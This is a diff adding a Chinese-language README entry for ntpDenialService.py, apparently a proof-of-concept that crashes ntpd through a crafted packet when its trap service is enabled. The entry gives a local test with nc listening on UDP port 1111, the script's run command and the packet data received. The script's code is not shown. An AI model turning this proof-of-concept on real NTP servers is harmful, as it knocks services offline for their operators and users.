@@ -161,3 +161,22 @@ Sent 1 packets.
 .
 ....
 ```
+
+### ntpDenialService.py 一个使ntp拒绝服务的poc代码
+```
+构造一个特殊的数据包，ntpd没有默认开启trap服务，如果trap被开启，攻击者就能通过特别构造的数据包导致空指针引、ntpd崩溃，进而导致服务器拒绝服务。
+测试：
+监听本地udp 1111 端口
+➜  ~ nc -l -u 0 1111
+
+执行：
+➜  Hacking git:(master) ✗ python ntpDenialService.py 127.0.0.1 1111
+[-] Sending payload to 127.0.0.1:1111 ...
+[+] Done!
+
+➜  ~ nc -l -u 0 1111
+
+6nonce, laddr=[]:Hrags=32, laddr=[]:WOP2, laddr=[]:WOP
+
+接受到这个特殊的数据包，ntpd崩溃，形成拒绝服务
+```
